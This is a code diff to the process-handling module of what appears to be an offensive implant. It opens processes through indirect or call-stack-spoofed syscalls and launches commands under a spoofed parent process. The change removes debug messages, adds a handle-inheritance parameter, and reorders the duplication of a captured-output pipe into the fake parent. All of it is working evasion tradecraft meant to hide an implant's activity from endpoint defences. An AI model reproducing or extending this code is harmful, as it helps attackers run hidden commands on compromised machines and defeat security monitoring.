@@ -12,7 +12,6 @@ auto DECLFN Process::Open(
     OBJECT_ATTRIBUTES ObjAttr = { sizeof(ObjAttr) };
 
     if ( ! ( Flags & (SYSCALL_INDIRECT | SYSCALL_SPOOF) ) ) {
-        KH_DBG_MSG
         return Self->Krnl32.OpenProcess( RightsAccess, InheritHandle, ProcessID );
     }
 
@@ -25,10 +24,8 @@ auto DECLFN Process::Open(
         : 0;
 
     if ( Flags & SYSCALL_INDIRECT && ! ( Flags & SYSCALL_SPOOF ) ) {
-        KH_DBG_MSG
         SyscallExec(Sys::OpenProc, Status, &Handle, RightsAccess, &ObjAttr, &ClientID);
     } else {
-        KH_DBG_MSG
         Status = Self->Spf->Call(
             Address, ssn, (UPTR)&Handle, (UPTR)RightsAccess,
             (UPTR)&ObjAttr, (UPTR)&ClientID
@@ -42,6 +39,7 @@ auto DECLFN Process::Open(
 
 auto DECLFN Process::Create(
     _In_  PCHAR                CommandLine,
+    _In_  ULONG                InheritHandles,
     _In_  ULONG                PsFlags,
     _Out_ PPROCESS_INFORMATION PsInfo
 ) -> BOOL {
@@ -91,28 +89,6 @@ auto DECLFN Process::Create(
         Success = Self->Krnl32.CreatePipe( &PipeRead, &PipeWrite, &SecurityAttr, PIPE_BUFFER_LENGTH );
         if ( !Success ) { goto _KH_END; }
 
-        if ( Self->Ps->Ctx.ParentID ) {
-            PsHandle = Self->Ps->Open( PROCESS_CREATE_PROCESS | PROCESS_DUP_HANDLE, FALSE, Self->Ps->Ctx.ParentID );
-            if ( ! PsHandle || PsHandle == INVALID_HANDLE_VALUE ) {
-                Success = FALSE; goto _KH_END;
-            }
-
-            if ( Self->Spf->Enabled ) {
-                Success = Self->Krnl32.DuplicateHandle(
-                    NtCurrentProcess(), PipeWrite, PsHandle, &PipeDuplic, 0,
-                    TRUE, DUPLICATE_SAME_ACCESS | DUPLICATE_CLOSE_SOURCE
-                );
-            } else {
-                Success = Self->Krnl32.DuplicateHandle( 
-                    NtCurrentProcess(), PipeWrite, PsHandle, &PipeDuplic, 0,
-                    TRUE, DUPLICATE_SAME_ACCESS | DUPLICATE_CLOSE_SOURCE
-                );
-            }
-            if ( ! Success || ! PipeDuplic || PipeDuplic == INVALID_HANDLE_VALUE ) { goto _KH_END; }
-
-            PipeWrite = PipeDuplic;
-        }
-
         SiEx.StartupInfo.hStdError  = PipeWrite;
         SiEx.StartupInfo.hStdOutput = PipeWrite;
         SiEx.StartupInfo.hStdInput  = Self->Krnl32.GetStdHandle( STD_INPUT_HANDLE );
@@ -121,8 +97,25 @@ auto DECLFN Process::Create(
         if ( Self->Ps->Ctx.ParentID ) PipeWrite = nullptr;
     }
 
+    if ( Self->Ps->Ctx.ParentID ) {
+        PsHandle = Self->Ps->Open( PROCESS_CREATE_PROCESS | PROCESS_DUP_HANDLE, FALSE, Self->Ps->Ctx.ParentID );
+        if ( ! PsHandle || PsHandle == INVALID_HANDLE_VALUE ) {
+            Success = FALSE; goto _KH_END;
+        }
+
+        if ( Self->Ps->Ctx.Pipe ) {
+            Success = Self->Krnl32.DuplicateHandle(
+                NtCurrentProcess(), PipeWrite, PsHandle, &PipeDuplic, 0,
+                TRUE, DUPLICATE_SAME_ACCESS | DUPLICATE_CLOSE_SOURCE
+            );
+
+            if ( ! Success || ! PipeDuplic || PipeDuplic == INVALID_HANDLE_VALUE ) { goto _KH_END; }
+            PipeWrite = PipeDuplic;
+        }
+    }
+
     Success = Self->Krnl32.CreateProcessA(
-        nullptr, CommandLine, nullptr, nullptr, TRUE, PsFlags,
+        nullptr, CommandLine, nullptr, nullptr, InheritHandles, PsFlags,
         nullptr, Self->Ps->Ctx.CurrentDir, &SiEx.StartupInfo, PsInfo
     );
     if ( !Success ) { goto _KH_END; }
